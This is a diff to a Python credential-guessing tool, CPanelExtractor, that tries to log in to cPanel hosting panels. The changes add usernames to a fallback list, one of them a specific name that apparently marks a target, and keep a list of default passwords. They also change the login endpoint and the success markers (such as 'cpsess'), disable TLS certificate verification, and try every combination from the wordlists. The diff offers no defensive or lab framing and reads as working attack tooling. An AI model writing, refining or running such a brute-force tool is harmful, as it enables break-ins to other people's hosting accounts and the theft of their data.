@@ -9,7 +9,7 @@ import urllib.parse
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
-FALLBACK_USERNAMES = ['root', 'admin', 'cpanel', 'webmaster']
+FALLBACK_USERNAMES = ['pschile', 'root', 'admin', 'cpanel', 'webmaster', 'admin-2']
 FALLBACK_PASSWORDS = ['', 'admin', 'password', '123456', 'cpanel']
 
 
@@ -62,20 +62,16 @@ class CPanelExtractor:
         return result
 
     def _get_login_token(self) -> str | None:
-        """Fetch the cPanel login page and extract the hidden security token.
+        """Verify cPanel login page is reachable.
 
         Returns:
-            str | None: Token string if found, otherwise None.
+            str | None: Empty string if reachable, None if unreachable.
         """
         try:
-            response = self._https_request('GET', '/login', body=None)
-            if not response:
-                return None
-            match = re.search(r'name=["\']security_token["\'][^>]*value=["\']([^"\']+)["\']', response)
-            if match:
-                return match.group(1)
-            # Some cPanel versions don't use a token — return empty string to proceed
-            return ''
+            response = self._https_request('GET', '/login/', body=None)
+            if response is not None:
+                return ''
+            return None
         except Exception as e:
             print(f"  [cPanel] Token fetch failed: {e}")
             return None
@@ -104,17 +100,16 @@ class CPanelExtractor:
                 params['security_token'] = token
 
             body = urllib.parse.urlencode(params)
-            response = self._https_request('POST', '/login/', body=body)
+            response = self._https_request('POST', '/login/?login_only=1', body=body)
 
             if not response:
                 return 'no_response'
 
             # Success indicators in cPanel response
+
             if any(indicator in response for indicator in [
                 '"status":1',
-                '"status": 1',
-                'redirect',
-                '/frontend/',
+                '"redirect"',
                 'cpsess',
             ]):
                 return 'success'
@@ -140,8 +135,8 @@ class CPanelExtractor:
             ctx.check_hostname = False
             ctx.verify_mode = ssl.CERT_NONE
 
-            sock = socket.create_connection((self.ip, self.port), timeout=5)
-            sock = ctx.wrap_socket(sock, server_hostname=self.host)
+            sock = socket.create_connection((self.ip, self.port), timeout=10)
+            sock = ctx.wrap_socket(sock, server_hostname=self.host.split(':')[0])
 
             headers = (
                 f"{method} {path} HTTP/1.1\r\n"
@@ -174,7 +169,7 @@ class CPanelExtractor:
             return decoded
 
         except Exception:
-            return None
+            return ''
 
     def _load_credentials(self) -> list:
         """Load usernames and passwords from wordlist files and return all combinations.
